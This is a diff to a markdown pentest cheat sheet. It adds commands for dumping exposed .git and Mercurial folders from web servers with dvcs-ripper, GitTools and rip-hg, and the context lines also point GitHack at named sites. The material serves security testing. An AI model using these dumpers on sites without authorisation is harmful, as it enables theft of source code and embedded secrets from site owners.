@@ -16,6 +16,8 @@
 - [BAZAAR - Source code management](#bazaar---source-code-management)
   - [Automatic way : rip-bzr](#automatic-way--rip-bzr)
   - [Automatic way : bzr_dumper](#automatic-way--bzr_dumper)
+- [MERCURIAL - Source code management](#mercurial---source-code-management)
+  - [Automatic way : rip-hg](#automatic-way--rip-hg)
 
 ## GIT - Source code management
 
@@ -122,6 +124,7 @@ git checkout
 ### Automatic way : rip-git
 
 ```powershell
+git clone https://github.com/kost/dvcs-ripper
 perl rip-git.pl -v -u "http://edge1.web.*****.com/.git/"
 
 git cat-file -p 07603070376d63d911f608120eb4b5489b507692  
@@ -138,6 +141,14 @@ git cat-file -p 5dae937a49acc7c2668f5bcde2a9fd07fc382fe2
 ```powershell
 git clone https://github.com/lijiejie/GitHack
 GitHack.py http://www.openssl.org/.git/
+```
+
+### Automatic way: GitTools
+
+```powershell
+git clone https://github.com/internetwache/GitTools
+./gitdumper.sh http://target.tld/.git/ /tmp/destdir
+git checkout -- .
 ```
 
 ### Harvesting secrets : trufflehog
@@ -209,7 +220,7 @@ python svn-extractor.py –url "url with .svn available"
 
 ```powershell
 wget https://raw.githubusercontent.com/kost/dvcs-ripper/master/rip-bzr.pl
-docker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper rip-git.pl -v -u  
+docker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper rip-bzr.pl -v -u
 ```
 
 ### Automatic way : bzr_dumper
@@ -235,6 +246,15 @@ $ bzr revert
  N  application.py
  N  database.py
  N  static/   
+```
+
+## MERCURIAL - Source code management
+
+### Automatic way : rip-hg.pl
+
+```powershell
+wget https://raw.githubusercontent.com/kost/dvcs-ripper/master/rip-hg.pl
+docker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper rip-hg.pl -v -u
 ```
 
 ## References
